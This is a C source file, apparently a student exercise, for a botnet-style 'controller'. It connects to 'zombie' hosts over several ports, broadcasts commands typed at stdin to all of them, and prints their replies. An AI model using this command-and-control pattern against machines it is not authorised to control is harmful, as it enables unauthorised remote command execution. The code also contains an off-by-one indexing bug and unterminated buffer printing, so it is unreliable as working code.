#include <string.h>
#include <libgen.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>

#include "utils_v2.h"
#include "header.h"
#include "network.h"

#define BUFFER_SIZE 5000
#define MAX_ARGUMENTS 100
#define MAX_LENGTH 100


volatile sig_atomic_t signalCount = 0;

pid_t childPid;


void handleSIGINT(int signal) {
    signalCount = 1;
}

int connectToZombies(char* serverIP, int serverPort) {

    int sockfd;
    sockfd = ssocket();

    if(ssconnect(serverIP, serverPort, sockfd) != -1){
         printf("Connected to server %s on port %d\n", serverIP, serverPort);
         return sockfd;
    } else {
        // Echec de la connexion au serveur
        return 0;
    }
}


void listenToTheZombies(void* ptrArray, void* logicalSize) {
    int* array = ptrArray;
    int lSize = *(int*) logicalSize;
    char msg[BUFFER_SIZE];

    /* 1024 server connection MAX*/
    struct pollfd fds[1024];
    bool fds_invalid[1024];
    int nbSockfd = 0;

    for (int i = 0; i < lSize; i++) {
        fds[nbSockfd].fd = array[i];
        fds[nbSockfd].events = POLLIN;
        nbSockfd++;
        fds_invalid[nbSockfd] = false;
    }

    while (!signalCount) {
        spoll(fds, nbSockfd, 0);

        for (int i = 0; i < nbSockfd; i++) {
            if (fds[i].revents & POLLIN && !fds_invalid[i]) {
                int bytesRead = sread(fds[i].fd, msg, sizeof(msg));
                if (bytesRead <= 0) {
                    fds_invalid[i] = true;
                    continue;
                }
                printf("Message recu:\n%s\n", msg);
            }
        }
    }

    for (int i = 0; i < nbSockfd; i++) {
        if (!fds_invalid[i]) {
            sclose(fds[i].fd);
        }
    }
}


int main(int argc, char** argv) {

    int* array = NULL; 
    int lSize = 0;  
    int pSize = 0; 
    char command[BUFFER_SIZE];

    if (argc < 2) {
        printf("Usage: ./controller argument1 argument2 ... argumentN\n");
        return 1;
    }

    char servers[MAX_ARGUMENTS][MAX_LENGTH];

    for (int i = 1; i < argc; i++) {
        strncpy(servers[i - 1], argv[i], MAX_LENGTH - 1);
        servers[i - 1][MAX_LENGTH - 1] = '\0';
    }

    //malloc ?

    for (int i = 0; i < argc - 1; i++) {
        for(int j = 0; j < NUM_PORTS; j++) {

            int sockfd = connectToZombies(servers[i], PORTS[j]);
            if(sockfd != 0){
                if (lSize >= pSize) {
                
                    pSize += 10; 
                    int* newArray = (int*)realloc(array, pSize * sizeof(int));
                    if (newArray == NULL) {
                        printf("Error realloc.\n");
                        free(array);
                        return 0;
                    }
                    array = newArray;
                }
                array[lSize] = sockfd;
                lSize++;
            }        
        }
    }
    printf("Number of connection established : %d\n", lSize);

    signal(SIGINT, handleSIGINT);

    childPid = fork_and_run2(listenToTheZombies, array, &lSize);

    if (childPid > 0) {
    /* Programme père */
    printf("Entrez une commande :\n");
    while (!signalCount) {
        if (fgets(command, BUFFER_SIZE, stdin) == NULL) {
    
            printf("CTRL-D...\n");
            signalCount = 1; 
            break;
        }
        //command[strcspn(command, "\n")] = 0;

        for(int i = 0 ; i < lSize ; i++){
            swrite(array[i], &command, strlen(command));
        }
    }
    kill(childPid, SIGINT); 
    
    }

    free(array);    
    return 0;

    /* Close tout les sockfd !*/
}
